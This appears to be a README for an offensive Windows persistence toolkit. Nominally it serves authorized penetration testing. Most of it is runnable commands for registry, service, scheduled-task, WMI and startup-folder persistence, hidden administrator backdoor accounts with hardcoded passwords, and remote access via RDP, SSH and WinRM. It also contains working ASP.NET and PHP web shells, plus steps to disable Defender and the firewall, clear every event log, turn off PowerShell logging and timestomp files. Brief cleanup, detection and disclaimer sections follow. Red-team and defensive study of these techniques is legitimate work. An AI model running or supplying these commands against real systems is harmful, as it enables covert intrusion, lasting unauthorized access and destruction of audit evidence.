# 🎯 Windows Persistence Toolkit

> **Advanced Windows persistence techniques and backdoor methodologies for authorized penetration testing, red team operations, and security research.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-Educational-green.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.6+-yellow.svg)](https://python.org)
[![Metasploit](https://img.shields.io/badge/Metasploit-Compatible-red.svg)](https://metasploit.com)

## 🚀 Overview

This repository contains a comprehensive collection of Windows persistence techniques, backdoor methodologies, and stealth mechanisms designed for professional security assessments. The toolkit provides multiple vectors for maintaining access to Windows systems through various persistence mechanisms, from basic registry modifications to advanced WMI event subscriptions.

### **Key Features**
- 🔐 **Multi-Vector Persistence** - Registry, Services, Tasks, WMI, Startup
- 🛡️ **Stealth Techniques** - Anti-detection and evasion methods
- 🎯 **Professional Tools** - Production-ready scripts and automation
- 📚 **Educational Resources** - Comprehensive documentation and examples
- 🧹 **Clean Exit** - Complete removal and cleanup procedures

## 📋 Table of Contents

- [Features](#features)
- [Quick Start](#quick-start)
- [Persistence Techniques](#persistence-techniques)
- [Backdoor Methods](#backdoor-methods)
- [Detection Evasion](#detection-evasion)
- [Usage Examples](#usage-examples)
- [Cleanup Procedures](#cleanup-procedures)
- [Legal Disclaimer](#legal-disclaimer)
- [Contributing](#contributing)

## ✨ Features

### **Persistence Mechanisms**
- 🔑 **Registry Persistence** - Run keys, Winlogon modifications
- ⏰ **Scheduled Tasks** - Time-based and event-based triggers  
- 🔧 **Windows Services** - System-level persistence
- 📊 **WMI Event Subscriptions** - Advanced stealth persistence
- 🔌 **COM Object Hijacking** - DLL injection techniques

### **Access Methods**
- 🖥️ **RDP Backdoors** - Remote Desktop with hidden users
- 🐚 **Reverse Shells** - TCP, HTTP, HTTPS callbacks
- 🔐 **SSH Tunnels** - Modern Windows SSH access
- 📡 **WinRM Access** - Windows Remote Management
- 🎯 **Web Shells** - Browser-based command execution

### **Payload Formats**
- 📦 **Executable Files** - Standalone EXE payloads
- 📚 **Dynamic Libraries** - DLL injection and hijacking
- 💻 **PowerShell Scripts** - Memory-resident execution
- 📝 **Batch Scripts** - Simple command-line persistence
- 🌐 **VBScript/JScript** - Windows Scripting Host payloads

## 🚀 Quick Start

### **Basic Registry Persistence**
```cmd
# Add persistence via Run key (system-wide)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\system32\backdoor.exe"

# User-specific persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UserService" /t REG_SZ /d "C:\Users\Public\service.exe"
```

### **Service-Based Persistence**
```cmd
# Create Windows service
sc create "WindowsUpdateService" binPath= "C:\Windows\system32\updater.exe" start= auto DisplayName= "Windows Update Service"

# Start service
sc start "WindowsUpdateService"
```

### **Scheduled Task Persistence**
```cmd
# Daily task
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\maintenance.exe" /sc daily /st 14:30

# Startup task
schtasks /create /tn "StartupTask" /tr "C:\Windows\startup.exe" /sc onstart /ru SYSTEM
```

## 🔐 Persistence Techniques

### **1. Registry-Based Persistence**

#### **Run Keys (Most Common)**
```cmd
# System-wide (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\system32\update.exe"

# User-specific
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UserService" /t REG_SZ /d "C:\Users\Public\service.exe"

# RunOnce (executes once)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemCheck" /t REG_SZ /d "C:\temp\check.exe"
```

#### **Advanced Registry Locations**
```cmd
# Winlogon Shell replacement
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,C:\Windows\backdoor.exe"

# Userinit modification  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\backdoor.exe"

# Image File Execution Options
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\backdoor.exe"
```

### **2. Scheduled Task Persistence**

#### **Time-Based Tasks**
```cmd
# Every 5 minutes
schtasks /create /tn "SystemMonitor" /tr "C:\Windows\monitor.exe" /sc minute /mo 5 /ru SYSTEM

# Daily at specific time
schtasks /create /tn "DailyCheck" /tr "C:\Windows\check.exe" /sc daily /st 14:30

# Weekly maintenance
schtasks /create /tn "WeeklyMaintenance" /tr "C:\Windows\maintenance.exe" /sc weekly /d SUN /st 02:00
```

#### **Event-Based Tasks**
```cmd
# On system startup
schtasks /create /tn "StartupService" /tr "C:\Windows\startup.exe" /sc onstart /ru SYSTEM

# On user logon
schtasks /create /tn "LogonScript" /tr "C:\Windows\logon.exe" /sc onlogon

# On system idle
schtasks /create /tn "IdleTask" /tr "C:\Windows\idle.exe" /sc onidle /i 10
```

### **3. Windows Service Persistence**

#### **Service Creation**
```cmd
# Create new service
sc create "SecurityHealthService" binPath= "C:\Windows\system32\security.exe" start= auto DisplayName= "Windows Security Health Service"

# Set service description
sc description "SecurityHealthService" "Monitors system security health and provides security updates"

# Configure service failure actions
sc failure "SecurityHealthService" reset= 86400 actions= restart/5000/restart/5000/restart/5000

# Start service
sc start "SecurityHealthService"
```

#### **Service Modification**
```cmd
# Modify existing service
sc config "Themes" binPath= "C:\Windows\system32\svchost.exe -k netsvcs -p -s Themes && C:\Windows\backdoor.exe"

# Change service startup type
sc config "SecurityHealthService" start= auto

# Set service dependencies
sc config "SecurityHealthService" depend= "RpcSs/RPCSS"
```

### **4. WMI Event Subscription**

#### **Event Filter Creation**
```cmd
# Create WMI event filter (triggers every 30 minutes)
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="SystemPerformanceFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
```

#### **Event Consumer Creation**
```cmd
# Create command line event consumer
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SystemPerformanceConsumer", CommandLineTemplate="C:\Windows\system32\performance.exe"
```

#### **Filter-Consumer Binding**
```cmd
# Bind filter to consumer
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SystemPerformanceFilter\"", Consumer="CommandLineEventConsumer.Name=\"SystemPerformanceConsumer\""
```

### **5. Startup Folder Persistence**

#### **System-Wide Startup**
```cmd
# All users startup folder
copy "backdoor.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"

# Alternative system startup location
copy "backdoor.exe" "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\startup.exe"
```

#### **User-Specific Startup**
```cmd
# Current user startup
copy "backdoor.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UserUpdate.exe"

# Specific user startup
copy "backdoor.exe" "C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.exe"
```

## 🚪 Backdoor Methods

### **1. RDP Backdoor Setup**

#### **User Account Creation**
```cmd
# Create hidden admin user
net user /add backdoor P@ssw0rd123!
net localgroup administrators backdoor /add

# Hide from login screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0

# Set password never expires
wmic useraccount where "name='backdoor'" set PasswordExpires=FALSE
```

#### **RDP Configuration**
```cmd
# Enable Remote Desktop
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0

# Enable RDP through Windows Firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Start Terminal Service
net start TermService

# Set RDP port (optional)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389
```

### **2. SSH Backdoor (Windows 10+)**

#### **OpenSSH Installation**
```powershell
# Install OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start SSH service
Start-Service sshd

# Set service to automatic
Set-Service -Name sshd -StartupType 'Automatic'

# Configure firewall
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
```

#### **SSH Key Configuration**
```powershell
# Create SSH directory
New-Item -Type Directory -Path "C:\Users\backdoor\.ssh"

# Add authorized key
Set-Content -Path "C:\Users\backdoor\.ssh\authorized_keys" -Value "ssh-rsa AAAAB3Nza... your-public-key"

# Set proper permissions
icacls "C:\Users\backdoor\.ssh\authorized_keys" /inheritance:r /grant "backdoor:F"
```

### **3. WinRM Backdoor**

#### **WinRM Configuration**
```cmd
# Enable WinRM
winrm quickconfig -q

# Configure WinRM for unencrypted traffic
winrm set winrm/config/service @{AllowUnencrypted="true"}

# Set authentication methods
winrm set winrm/config/service/auth @{Basic="true"}

# Add user to Remote Management group
net localgroup "Remote Management Users" backdoor /add
```

#### **PowerShell Remoting**
```powershell
# Enable PowerShell remoting
Enable-PSRemoting -Force

# Set execution policy
Set-ExecutionPolicy RemoteSigned -Force

# Configure trusted hosts (if needed)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
```

### **4. Web Shell Backdoor**

#### **ASP.NET Web Shell**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        proc.Close();
    }
}
</script>
```

#### **PHP Web Shell**
```php
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

## 🛡️ Detection Evasion

### **Anti-Virus Evasion**

#### **File Attribute Manipulation**
```cmd
# Hide files
attrib +h +s C:\Windows\system32\backdoor.exe

# Set system timestamps
powershell "(Get-Item 'C:\Windows\system32\backdoor.exe').CreationTime = (Get-Item 'C:\Windows\system32\explorer.exe').CreationTime"
powershell "(Get-Item 'C:\Windows\system32\backdoor.exe').LastWriteTime = (Get-Item 'C:\Windows\system32\explorer.exe').LastWriteTime"
```

#### **Security Software Bypass**
```cmd
# Disable Windows Defender (requires admin)
powershell "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell "Add-MpPreference -ExclusionPath C:\Windows\system32"
powershell "Add-MpPreference -ExclusionExtension .exe"

# Disable Windows Firewall
netsh advfirewall set allprofiles state off
```

### **Log Evasion**

#### **Event Log Clearing**
```cmd
# Clear specific event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# Clear all event logs
for /f "tokens=1" %i in ('wevtutil el') do wevtutil cl "%i"
```

#### **PowerShell Logging Bypass**
```powershell
# Disable PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
```

### **Process Hiding**

#### **Service Masquerading**
```cmd
# Run as legitimate service
sc create "WindowsSecurityHealthService" binPath= "C:\Windows\system32\svchost.exe -k SecurityHealth -p -s SecurityHealthService"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\system32\backdoor.dll"
```

#### **DLL Hijacking**
```cmd
# Replace legitimate DLL
copy "malicious.dll" "C:\Windows\system32\version.dll"
copy "malicious.dll" "C:\Program Files\Application\missing.dll"
```

## 💡 Usage Examples

### **Complete RDP Backdoor Setup**
```cmd
# Create backdoor user
net user /add support P@ssw0rd2024!
net localgroup administrators support /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v support /t REG_DWORD /d 0

# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net start TermService

# Connect: rdesktop -u support -p 'P@ssw0rd2024!' target-ip
```

### **Registry + Service Persistence Combo**
```cmd
# Registry persistence
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemService" /t REG_SZ /d "C:\Windows\system32\service.exe"

# Service persistence
sc create "SystemService" binPath= "C:\Windows\system32\service.exe" start= auto DisplayName= "System Service"
sc start "SystemService"

# Scheduled task backup
schtasks /create /tn "SystemService" /tr "C:\Windows\system32\service.exe" /sc onstart /ru SYSTEM
```

### **WMI Stealth Persistence**
```cmd
# Create WMI event subscription for stealth persistence
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="SecurityUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SecurityConsumer", CommandLineTemplate="C:\Windows\system32\SecurityUpdate.exe"

wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SecurityUpdate\"", Consumer="CommandLineEventConsumer.Name=\"SecurityConsumer\""
```

## 🧹 Cleanup Procedures

### **Registry Cleanup**
```cmd
# Remove Run keys
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UserService" /f

# Restore Winlogon settings
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
```

### **Service Cleanup**
```cmd
# Stop and remove services
sc stop "SecurityHealthService"
sc delete "SecurityHealthService"

# Remove service registry entries
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /f
```

### **Task Cleanup**
```cmd
# Remove scheduled tasks
schtasks /delete /tn "SystemMonitor" /f
schtasks /delete /tn "DailyCheck" /f
schtasks /delete /tn "StartupService" /f
```

### **WMI Cleanup**
```cmd
# Remove WMI subscriptions
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE "Filter=\"__EventFilter.Name='SystemPerformanceFilter'\"" DELETE
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE "Name='SystemPerformanceConsumer'" DELETE
wmic /namespace:\\root\subscription PATH __EventFilter WHERE "Name='SystemPerformanceFilter'" DELETE
```

### **File Cleanup**
```cmd
# Remove backdoor files
del "C:\Windows\system32\backdoor.exe"
del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UserUpdate.exe"

# Remove backdoor users
net user backdoor /delete
net user support /delete
```

## 🔍 Detection and Forensics

### **Common Detection Methods**
- **Registry Monitoring** - Watch for Run key modifications
- **Service Analysis** - Examine service configurations and DLLs
- **Task Scheduler** - Review scheduled tasks for anomalies
- **WMI Subscriptions** - Check for persistent WMI events
- **User Account Auditing** - Monitor for new user creation
- **File System Changes** - Track startup folder modifications

### **Forensic Artifacts**
- **Registry Hives** - SYSTEM, SOFTWARE, NTUSER.DAT
- **Event Logs** - Security, System, Application logs
- **Prefetch Files** - Evidence of program execution
- **AmCache** - Application execution tracking
- **SRUM Database** - System Resource Usage Monitor
- **WMI Repository** - Persistent WMI subscription data

## ⚖️ Legal Disclaimer

**IMPORTANT**: This toolkit is designed for **authorized penetration testing**, **security research**, and **educational purposes only**.

### **Authorized Use**
- ✅ Systems you **own** or have **explicit written permission** to test
- ✅ **Professional penetration testing** with proper contracts
- ✅ **Educational research** in controlled environments
- ✅ **Red team exercises** with organizational approval

### **Prohibited Use**
- ❌ **Unauthorized access** to any system
- ❌ **Malicious activities** or **criminal purposes**
- ❌ **Violation of laws** or **regulations**
- ❌ **Any activity** without proper authorization

### **Responsibility**
The authors and contributors are **not responsible** for any misuse of this toolkit. Users are **solely responsible** for ensuring their activities are legal and authorized.

## 📚 Educational Resources

### **Learning Objectives**
- Understanding Windows persistence mechanisms
- Registry and service manipulation techniques
- WMI event subscription concepts
- Detection and evasion methodologies
- Incident response and forensic analysis

### **Recommended Reading**
- **Windows Internals** - Microsoft Press
- **The Art of Memory Forensics** - Wiley
- **Practical Malware Analysis** - No Starch Press
- **Windows Registry Forensics** - Syngress
- **MITRE ATT&CK Framework** - Persistence techniques

### **Related Frameworks**
- **MITRE ATT&CK** - Tactics, Techniques, and Procedures
- **NIST Cybersecurity Framework** - Security controls
- **OWASP Testing Guide** - Web application security
- **PTES** - Penetration Testing Execution Standard

## 🤝 Contributing

We welcome contributions from the security community!

### **How to Contribute**
1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/new-technique`)
3. **Commit** your changes (`git commit -am 'Add new persistence technique'`)
4. **Push** to the branch (`git push origin feature/new-technique`)
5. **Create** a Pull Request

### **Contribution Guidelines**
- Follow existing code style and conventions
- Include comprehensive documentation
- Add appropriate error handling
- Include cleanup procedures for new techniques
- Test on multiple Windows versions when possible

### **What We're Looking For**
- New persistence techniques and vectors
- Improved detection evasion methods
- Better cleanup and removal procedures
- Documentation improvements
- Bug fixes and optimizations

## 📞 Support

### **Getting Help**
- **Issues**: Report bugs and request features via GitHub Issues
- **Discussions**: Join community discussions for technique sharing
- **Documentation**: Comprehensive guides and examples included

### **Community**
- Share new techniques and improvements
- Collaborate on research and development
- Provide feedback and suggestions
- Help other users learn and improve

## 🏆 Acknowledgments

Special thanks to the security research community, penetration testers, and red team professionals who continuously advance the field of offensive security and help organizations improve their defensive capabilities.

---

**⚠️ Remember: Use responsibly, ethically, and legally. Always obtain proper authorization before testing.**

**🔒 Security Research Disclaimer**: This toolkit is intended to help security professionals identify and remediate persistence techniques in their environments. It should only be used in authorized testing scenarios. 
